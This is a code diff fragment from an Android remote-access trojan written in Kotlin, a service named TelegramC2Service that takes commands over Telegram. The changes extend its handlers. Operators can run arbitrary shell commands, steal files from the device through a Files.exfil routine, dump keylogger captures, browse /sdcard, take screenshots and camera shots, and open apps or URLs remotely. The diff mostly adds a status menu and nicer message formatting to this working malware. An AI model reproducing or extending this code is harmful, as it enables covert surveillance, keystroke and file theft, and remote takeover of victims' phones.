+                val lines = text.lines().takeLast(50).joinToString("\n")
+                sendMessage("<b>⌨️ Keylog dump</b>\n<pre>${lines.take(3500)}</pre>")
+                refreshCurrentMenu()
             }
+            "keylog_info" -> sendMessage("keylog state: " +
+                (if (KeylogBuffer.isActive()) "🟢 recording" else "🔴 stopped"))
+
             "ls" -> {
                 val res = Files.listDir(sub.ifEmpty { "/sdcard" })
-                sendMessage("<pre>${res.toString(2).take(3500)}</pre>")
+                sendMessage("<b>📂 <code>$sub</code></b>\n<pre>${res.toString(2).take(3500)}</pre>")
             }
             "refresh" -> {
-                sendMessage("🔄 refreshing...")
-                delay(500)
+                sendMessage("🔄 refreshing…")
+                delay(300)
+                refreshCurrentMenu()
                 sendMainMenu()
             }
             else -> sendMessage("unknown action: $action")
         }
-        log("runAction[$action] exited")
     }
 
     private suspend fun dispatchTextCommand(text: String) {
@@ -624,11 +833,19 @@ class TelegramC2Service : Service() {
 
         when (cmd) {
             "start", "menu", "help" -> sendMainMenu()
+            "status" -> {
+                val id = sendMessageWithKeyboard(statusMenuText(), statusMenuKeyboard())
+                if (id > 0) {
+                    currentMenuMessageId = id
+                    currentMenuPath = mutableListOf("status")
+                }
+            }
             "shell" -> {
-                if (arg.isEmpty()) { sendMessage("usage: /shell &lt;cmd&gt;"); return }
+                if (arg.isEmpty()) { sendMessage("usage: <code>/shell ls -la</code>"); return }
+                sendChatAction("typing")
                 val res = Shell.exec(arg)
                 val out = res.optString("stdout", "") + res.optString("stderr", "")
-                sendMessage("<pre>[exit ${res.optInt("exit", -1)}]\n${out.take(3500)}</pre>")
+                sendMessage("<b>💻 shell</b> <code>[exit ${res.optInt("exit", -1)}]</code>\n<pre>${out.take(3500)}</pre>")
             }
             "screenshot" -> runAction("screenshot", "")
             "camera" -> runAction("camera", arg.ifEmpty { "back" })
@@ -648,17 +865,18 @@ class TelegramC2Service : Service() {
             "keylog_stop" -> runAction("keylog_stop", "")
             "keylog_dump" -> runAction("keylog_dump", "")
             "get" -> {
-                if (arg.isEmpty()) { sendMessage("usage: /get &lt;path&gt;"); return }
+                if (arg.isEmpty()) { sendMessage("usage: <code>/get /path/to/file</code>"); return }
+                sendChatAction("upload_document")
                 val res = Files.exfil(this, arg)
                 val b64 = res.optString("data_b64", "")
-                if (b64.isEmpty()) { sendMessage("error: ${res.optString("error")}"); return }
+                if (b64.isEmpty()) { sendMessage("⚠️ ${res.optString("error")}"); return }
                 val name = arg.substringAfterLast('/').ifEmpty { "file.bin" }
                 sendDocument(name, "application/octet-stream", Base64.decode(b64, Base64.NO_WRAP))
             }
             "open" -> sendMessage(SystemControl.openApp(this, arg).toString())
             "url" -> sendMessage(SystemControl.openUrl(this, arg).toString())
             "info" -> runAction("info", "")
-            else -> sendMessage("unknown: /$cmd — try /start")
+            else -> sendMessage("❓ unknown: /$cmd — try /start")
         }
     }
 
